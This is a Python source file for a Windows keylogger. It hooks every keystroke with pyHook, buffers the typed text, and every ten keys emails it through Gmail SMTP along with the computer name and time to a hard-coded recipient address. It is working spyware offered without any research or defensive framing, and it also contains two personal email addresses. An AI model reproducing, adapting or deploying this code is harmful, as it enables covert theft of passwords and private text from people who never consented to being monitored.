import pyHook,pythoncom
import  sys, logging,os,time
from threading import Thread,Lock
import smtplib,ctypes

inerLock = Lock()

file_log = 'test.txt'

def send (sender_email,
          sender_pass,
          target,
          msg):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(sender_email,sender_pass)

    try:
        server.sendmail(sender_email,target,"Subject: %s\n\n%s" %('AppInfo',msg))
        print("Email Sent!")
        server.close()
    except:
        print("No internet connection, or there is a problem with the connection to gmail")
        server.close()
        pass
                                      
def check():
    global point,text,text_edit
    while True:
        if point == 10:
            with inerLock:
                point = 0
            text_edit = "\n\nComputer Name: "+os.environ['COMPUTERNAME']+"\nTime: "+time.asctime()+"\n"+ text_edit + "\n"
            mailer = Thread(target=send,args=("muqtado3g@gmail.com","********","mishra.coolamon@gmail.com",text_edit))
            mailer.start()
            text = ""
            text_edit = ""
            ctypes.windll.user32.PostQuitMessage(0)
        else:
            pass

point = 0
text = ""
text_edit = ""

def OnKeyboardEvent(event):
    global point,text,text_edit
    with inerLock:
        point +=1

    text += chr(event.Ascii)
    print(chr(event.Ascii)," ",str(event.Ascii))

    if event.Ascii == 8:
        text_edit = text_edit[:-1]
    else:
        text_edit = text_edit + chr(event.Ascii)
    ##    logging.basicConfig(filename=file_log, level = logging.DEBUG,format = '%(message)s')
    print(str(event.Ascii))
    print(chr(event.Ascii))

##    if event
##    with open(file_log, "a") as myfile:
##        myfile.write(ch)  
    return True

def hooker():
    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = OnKeyboardEvent
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()

def threader():
    hooks = Thread(target=hooker)
    checker = Thread(target=check)
    hooks.start()
    checker.start()

threader()
